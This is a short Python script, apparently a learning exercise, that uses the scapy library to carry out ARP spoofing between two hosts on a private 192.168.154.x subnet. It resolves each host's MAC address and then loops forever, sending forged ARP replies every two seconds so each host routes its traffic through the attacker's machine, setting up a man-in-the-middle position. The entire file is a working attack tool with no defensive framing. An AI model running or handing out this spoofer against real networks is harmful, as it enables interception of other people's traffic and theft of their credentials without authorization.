#!/usr/bin/env python
import time

import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    # scapy.srp get 2 lists, using scapy.srp()[0] to get the first list, with is answered_list
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose= False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
# scapy.ls(scapy.ARP)
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)

send_packets_count = 0

while True:
    spoof("192.168.154.2", "192.168.154.143")
    spoof("192.168.154.143", "192.168.154.2")

    send_packets_count = send_packets_count + 2
    print("[+] Packets send : " + str(send_packets_count))
    time.sleep(2)
